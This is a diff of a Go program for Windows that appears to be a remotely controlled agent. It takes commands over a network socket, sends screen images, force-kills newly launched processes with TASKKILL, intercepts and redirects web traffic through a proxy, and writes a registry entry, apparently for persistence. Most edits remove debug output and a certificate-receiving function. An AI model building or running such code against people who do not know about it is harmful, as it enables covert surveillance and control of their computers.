@@ -20,7 +20,6 @@ import (
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 	"image/jpeg"
-	"io"
 	"io/ioutil"
 	"log"
 	"math/rand"
@@ -78,7 +77,6 @@ func sendImages(conn net.Conn) {
 }
 
 func closeNewProcesses(stopClose chan bool) {
-	//stopClose <- false
 	programOpened := map[int]bool{}
 	importantProcesses := map[string]bool{
 		"explorer.exe":                true,
@@ -163,11 +161,9 @@ func closeNewProcesses(stopClose chan bool) {
 
 				// If the process is not in the current list, it's new
 				if !found {
-					//fmt.Printf("New process detected: %dmd\t%s\n", newProcess.Pid(), newProcess.Executable())
 					if !importantProcesses[newProcess.Executable()] && !programOpened[newProcess.Pid()] {
 						go func() {
 							kill := exec.Command("TASKKILL", "/T", "/F", "/IM", newProcess.Executable())
-							//fmt.Println("TASKKILL", "/T", "/F", "/IM", newProcess.Executable(), newProcess.Pid())
 							kill.Stderr = os.Stderr
 							kill.Stdout = os.Stdout
 							err := kill.Run()
@@ -198,10 +194,7 @@ func closeNewProcesses(stopClose chan bool) {
 								fmt.Println(pid, " ", cmd.Process, " ", newProcess.Executable(), " ", newProcess.Pid())
 								programOpened[pid] = true
 							}
-
 						}()
-					} else {
-						//fmt.Println("Process is important and will not be terminated.:", newProcess.Executable())
 					}
 				}
 			}
@@ -242,7 +235,6 @@ func IsDialogBoxOpen() bool {
 			if err != nil {
 				fmt.Println("Failed to simulate enter key press:", err)
 			}
-			fmt.Println("activevevevevevev")
 			return true
 		}
 	}
@@ -263,31 +255,6 @@ func find() {
 		}
 	}
 	return
-}
-
-func customHTTPGet(url string) (*http.Response, error) {
-	client := &http.Client{
-		Timeout: time.Second * 10, // Set an appropriate timeout value
-	}
-
-	req, err := http.NewRequest("GET", url, nil)
-	if err != nil {
-		return nil, err
-	}
-
-	// Set any necessary headers or configuration options on the request
-
-	resp, err := client.Do(req)
-	if err != nil {
-		return nil, err
-	}
-
-	if resp.StatusCode != http.StatusOK {
-		resp.Body.Close()
-		return nil, fmt.Errorf("unexpected status code: %d", resp.StatusCode)
-	}
-
-	return resp, nil
 }
 
 func redirect(source string, dest string) {
@@ -361,9 +328,9 @@ func redirect(source string, dest string) {
 			fmt.Println(req.URL.String())
 			if req.URL.Host == source {
 				session.SetProp("blocked", true)
-			} else if source == "all" && req.URL.Host != dest && strings.Contains(req.URL.Host, "www") {
-				//session.SetProp("blocked", true)
-				req2, err := http.NewRequest("GET", dest, nil)
+			} else if source == "all" && strings.Contains(req.URL.Host, "www") {
+				//make request to just a site doesn't matter since it will be blocked
+				req2, err := http.NewRequest("GET", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", nil)
 				if err != nil {
 					fmt.Println("Error creating request:", err)
 				}
@@ -375,7 +342,7 @@ func redirect(source string, dest string) {
 			req := session.Request()
 			if blocked, ok := session.GetProp("blocked"); ok && blocked.(bool) {
 				fmt.Println(req.URL.Host)
-				resp, err := customHTTPGet(dest)
+				resp, err := http.Get(dest)
 				if err != nil {
 					log.Fatal(err)
 				}
@@ -445,83 +412,13 @@ func stopClosing(stopClose chan bool) {
 
 func stopRedirecting() {
 	// Send a signal to the stop channel to stop the redirect function
-	fmt.Println("instop1")
 	stopRedirect1 = true
 	runningRedirect = false
-	fmt.Println("instop2")
 	return
 }
 
 func waitForStopClose(stopClose chan bool) {
 	<-stopClose
-}
-func receiveCert() {
-	ln, err := net.Listen("tcp", "0.0.0.0:12345")
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer ln.Close()
-
-	// Accept incoming connection
-	conn, err := ln.Accept()
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer conn.Close()
-	ln2, err := net.Listen("tcp", "0.0.0.0:12346")
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer ln.Close()
-
-	// Accept incoming connection
-	conn2, err := ln2.Accept()
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer conn2.Close()
-	// Specify the directory and filenames for saving the files
-	destDir := `C:\Users\IMOE001\Desktop` // Change this to the desired directory path
-	certFile := "demo.crt"
-	keyFile := "demo.key"
-
-	// Create the directory if it doesn't exist
-	err = os.MkdirAll(destDir, 0755)
-	if err != nil {
-		fmt.Println("Failed to create directory:", err)
-		os.Exit(1)
-	}
-
-	// Create output files for the received files
-	certOutputPath := filepath.Join(destDir, certFile)
-	certOutput, err := os.Create(certOutputPath)
-	if err != nil {
-		fmt.Println("Failed to create certificate file:", err)
-		os.Exit(1)
-	}
-	defer certOutput.Close()
-
-	keyOutputPath := filepath.Join(destDir, keyFile)
-	keyOutput, err := os.Create(keyOutputPath)
-	if err != nil {
-		fmt.Println("Failed to create key file:", err)
-		os.Exit(1)
-	}
-	defer keyOutput.Close()
-
-	// Transfer the crt file
-	_, err = io.Copy(certOutput, conn)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	// Transfer the key file
-	_, err = io.Copy(keyOutput, conn2)
-	if err != nil {
-		log.Fatal(err)
-	}
-
-	log.Println("File transfer completed!")
 }
 
 func addToRegistry() error {
@@ -558,7 +455,6 @@ func main() {
 
 	// Create a stop channel
 	stopClose := make(chan bool)
-	go waitForStopClose(stopClose)
 
 	// Loop forever and handle incoming connections
 	for {
@@ -600,9 +496,8 @@ func handleConnection(conn net.Conn, stopClose chan bool) {
 		},
 		"stopClosing":  func(args []string) { stopClosing(stopClose) },
 		"stopRedirect": func(args []string) { stopRedirecting() },
-		"receiveCert":  func(args []string) { receiveCert() },
 	}
-
+	go waitForStopClose(stopClose)
 	// Read commands from the client and execute the corresponding function
 	scanner := bufio.NewScanner(conn)
 	for scanner.Scan() {
